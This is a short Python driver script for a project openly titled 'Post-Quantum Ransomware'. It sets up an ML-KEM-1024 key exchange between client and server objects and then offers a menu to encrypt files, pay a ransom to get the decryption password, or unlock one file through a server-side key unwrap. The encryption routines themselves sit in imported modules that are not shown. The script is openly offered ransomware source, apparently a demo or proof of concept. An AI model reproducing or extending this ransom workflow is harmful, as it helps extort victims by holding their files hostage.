from client import Client
from server import Server
from pqcrypto.kem.ml_kem_1024 import generate_keypair


def main():
    print("=== Post-Quantum Ransomware ===\n")

    public_key, secret_key = generate_keypair()
    client = Client(public_key)
    server = Server(secret_key)
    ciphertext, plaintext_original = client.establish_shared_secret()
    plaintext_recovered = server.establish_shared_secret(ciphertext)

    if plaintext_original == plaintext_recovered:
        print("Shared secret established successfully between client and server.\n")
        client.derive_shared_secret(plaintext_original)
        server.derive_shared_secret(plaintext_original)
    else:
        print("Failed to establish shared secret between client and server.\n")

    while True:

        print("1. Encrypt files")
        print("2. Pay ransom")
        print("3. Unlock one file")
        print("4. Change password")

        selection = input("\nSelect an option (1-4): ")

        if selection == "1":
            encrypted_password, encrypted_master_key = client.encrypt_files()
            server.get_client_info(encrypted_password, encrypted_master_key)
            print("The files have been encrypted.\n")
        elif selection == "2":
            password = server.send_password()
            print(f"The ransom password is: {password}")
            client.decrypt_files(password)
            print("All files have been decrypted.\n")
        elif selection == "3":
            file_path = input("Enter the path of the file to unlock: ")
            wrapped_file_key = client.get_wrapped_file_key(file_path)
            file_key = server.unwrap_file_key(wrapped_file_key)
            client.decrypt_file(file_path, file_key)
            print(f"The file '{file_path}' has been decrypted.\n")
        elif selection == "4":
            print("Changing password...")
        else:
            print("Invalid selection. Please choose a valid option.")


if __name__ == "__main__":
    main()
